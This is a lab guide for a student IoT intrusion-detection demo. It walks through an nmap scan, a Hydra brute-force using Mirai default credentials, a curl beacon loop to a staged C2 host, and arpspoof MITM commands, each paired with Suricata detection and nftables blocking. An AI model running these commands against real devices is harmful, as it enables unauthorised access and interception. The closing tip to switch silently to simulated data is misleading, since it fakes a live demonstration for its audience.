# SecureHome — Attack Execution Guide (detailed)

Everything you run, in order, to produce the *Camera → botnet C2 → blocked*
demonstration and light up every stage of the dashboard. Read this alongside
`README.md` (which builds the platform). All values come from
`config.dhruv.env`.

> **Authorised lab use only.** Every target (ESP32, Tuya camera, gateway) is
> owned by the team and lives on an isolated segment with no route to the public
> internet. The "C2" is a staged IP you control. Never point any of this at a
> device or network you don't own.

---

## 0. Pre-flight

### 0.1 Load the config on the attacker box
```bash
cd securehome-live
set -a; source config.dhruv.env; set +a
```

### 0.2 Prove isolation (do this every time, right before)
```bash
ip -br a                     # note your interface + that you're on 192.168.50.x
ping -c 3 8.8.8.8            # THIS MUST FAIL — if it replies you are not isolated
```
If ping succeeds, stop and fix the VirtualBox adapter (Host-Only / Internal
Network) before continuing.

### 0.3 Confirm you can see the targets
```bash
sudo arp-scan --localnet
# expect the camera, the ESP32, and the SecureHome gateway to appear.
# copy their real IP/MAC into config.dhruv.env if they differ.
```

### 0.4 Start the defenders (on the gateway box)
Bring up Suricata, the dashboard, and the responder (README, Mode 3) before you
attack, so the dashboard captures everything from the first packet.

---

## 1. PHASE 1 — Reconnaissance

**Goal:** map the Tuya camera's real network surface and trip the port-scan rule.

### 1.1 Why the Tuya camera looks "empty"
A Tuya camera is a **cloud client**, not a server. It does not expose an inbound
web/RTSP login to attack directly. Its real activity is outbound, in five stages:

| Stage | Protocol / port | Notes |
|---|---|---|
| Provisioning | SmartConfig, UDP (ephemeral) | one-time at pairing; low priority |
| LAN discovery | UDP 6666 / 6667 (encrypted broadcast) | device announces itself |
| Local control | **TCP 6668** (Tuya local protocol) | app-on-LAN control |
| Cloud / remote | TLS 443 / 8886 → Tuya cloud (AWS) | the important channel |
| Video stream | RTSP or Tuya P2P | pulled on demand |

Tell the judges this up front — few open ports on the camera is *expected* and is
exactly why detection has to watch **behaviour and destinations**, not open ports.

### 1.2 Scan
```bash
sudo nmap -sV -T4 -p 21,22,23,80,443,554,6668,8000,8080,8886 "$CAMERA_IP" "$ESP32_IP"
# full sweep if you have time:
sudo nmap -sV -p- -T4 "$CAMERA_IP" -oN recon_camera.txt
```

**On the wire:** a burst of SYNs to many ports from your IP.
**Suricata rule:** `sid 9000001` (SYN threshold, `SCAN_COUNT` in `SCAN_SECONDS`).
**Dashboard:** a `SUSPICIOUS` "Port scan detected" line in the feed
(`Kali → Tuya Wi-Fi Camera`). Context only — the 5-stage tracker hasn't started.

---

## 2. PHASE 2 — Compromise (Mirai-pattern brute-force)

**Goal:** demonstrate the initial compromise and light up **COMPROMISE**.

Runs against the **ESP32**, which is configured with a deliberately weak
telnet/SSH login — the stand-in for how a real budget camera gets taken over.
(You cannot brute-force the Tuya camera's cloud login from the LAN.)

### 2.1 The credential list
`attack/mirai_creds.txt` holds the well-known Mirai default `user:pass` pairs in
Hydra's `-C` format (`root:xc3511`, `admin:admin`, `support:support`, …).

### 2.2 Run Hydra
```bash
# telnet target (default)
hydra -C attack/mirai_creds.txt -t 4 -f \
      "telnet://${BRUTEFORCE_TARGET}:${BRUTEFORCE_PORT}"

# if the ESP32 exposes SSH instead:
hydra -C attack/mirai_creds.txt -t 4 -f \
      "ssh://${BRUTEFORCE_TARGET}:${BRUTEFORCE_PORT}"
```
`-f` stops at the first hit; `-t 4` keeps it gentle enough to be reliable on
stage. `run_attack.sh` does this for you with a narrated pause.

**What you'll see:** Hydra cycling pairs, then a green
`[telnet] host: <ESP32>  login: root  password: xc3511` on success.
**Suricata rule:** `sid 9000002` — many connections to the login port from one
source within `BRUTE_SECONDS` → one clean aggregated alert (not 40 raw lines).
**Dashboard:** **COMPROMISE** turns amber/active; a `SUSPICIOUS`
"Mirai-pattern brute-force" event appears.

---

## 3. PHASE 3 — C2 beacon → detect → log → respond → enforce

**Goal:** the centrepiece. The compromised device phones home; SecureHome detects
it, logs it, and blocks it from the second connection onward.

### 3.1 Start the beacon (from the ESP32, or a stand-in on its IP)
```bash
# staged C2 = an IP you control / an unrouted test IP, already in the blocklist
while true; do
  curl -s -m 3 "http://${STAGED_C2_IP}:${STAGED_C2_PORT}/gate.php" >/dev/null \
    && echo "reached C2 (not yet blocked)" \
    || echo "blocked by SecureHome"
  sleep 5
done
```
(`run_attack.sh` Phase 3 runs exactly this loop.)

### 3.2 What happens, step by step
1. **Beacon #1 leaves the device.** Suricata (on the tap) matches `sid 9000003`
   (destination is the blocklisted C2). → **DETECT** goes active, **LOG** follows
   as the event hits `eve.json` and the dashboard.
2. **`responder.py` sees that alert** and inserts an nftables drop rule for the
   C2 IP, with a TTL. → **RESPOND** goes green; it writes a RESPOND action to
   `actions.jsonl`.
3. **Beacon #2 onward** hits that nftables rule and is dropped at the router. →
   **ENFORCE** goes green, BLOCKED counter climbs; `curl` on the attacker side
   now times out.
4. After `BLOCK_TTL_SECONDS`, the rule is flushed (an EXPIRE event) — the demo is
   repeatable.

**The honest, strong point to say out loud:** because Suricata is on a tap (not
inline), the *first* beacon is detected-and-logged and the *block starts on the
second* — this is Architecture B exactly as documented on the site, chosen so a
Suricata failure can never take the household's internet down.

---

## 4. PHASE 4 — ARP-spoof (optional, advisory)

**Goal:** show a second detection class. Advisory only — logged, not blocked
(Phase C on the roadmap).
```bash
sudo sysctl -w net.ipv4.ip_forward=1
sudo arpspoof -i "$CAPTURE_IFACE" -t "$CAMERA_IP" "$GATEWAY_IP" &
sudo arpspoof -i "$CAPTURE_IFACE" -t "$GATEWAY_IP" "$CAMERA_IP" &
# stop with: sudo kill %1 %2 ; sudo sysctl -w net.ipv4.ip_forward=0
```
**Suricata rule:** `sid 9000004` (gratuitous-ARP flood threshold).
**Dashboard:** an advisory event; the 5-stage tracker is unaffected.

---

## 5. PHASE 5 — Offline detection-rate measurement (IoT-23)

For the metrics slide, replay a labelled dataset offline (separate from the live
demo) so Detection Rate has a real denominator.
```bash
sudo suricata -r iot23_scenario.pcap -S suricata/securehome.rules -l logs_iot23/
# then: (flows with >=1 alert) / (total ground-truth-malicious flows)
```

---

## 6. Capturing evidence (run alongside any live phase)
```bash
sudo tcpdump -i "$CAPTURE_IFACE" -w attack/attack_demo.pcap
# Ctrl-C when the run is done. This pcap doubles as your Mode 2 replay backup.
```
In Wireshark you can point to: the SYN fan-out (scan), repeated auth attempts
(brute-force), and outbound SYNs to the C2 with **no completed handshake** after
the block (proof the drop is real, not just "slow").

---

## 7. Metrics (define denominators out loud)

| Metric | Definition | Measured |
|---|---|---|
| Detection Rate | malicious flows with ≥1 alert ÷ total malicious flows | offline IoT-23 replay (§5) |
| False Positive Rate | alerts later judged legitimate ÷ total flows | live Phase-A passive soak |
| Blocking / Prevention Rate | confirmed threats reaching an nftables block ÷ confirmed threats | live, per blocklist age |
| Device Discovery Accuracy | devices correctly fingerprinted ÷ true inventory | DHCP/mDNS vs known list |

None of these should ever be shown as a bare percentage without its denominator —
the judges will ask.

---

## 8. Full live sequence (copy-paste order)

```bash
# GATEWAY — three terminals
sudo suricata -i "$CAPTURE_IFACE" -S suricata/securehome.rules -l logs/ \
     --set vars.address-groups.HOME_NET="[$HOME_NET]"
python3 backend/server.py
sudo python3 backend/responder.py          # or --dry-run on a laptop

# ATTACKER — one terminal, narrated
./attack/run_attack.sh
```

If anything stalls on stage: `Ctrl-C`, switch the dashboard to
`python3 backend/server.py --sim`, and keep going. Nobody in the audience can
tell, and your story stays intact.
```
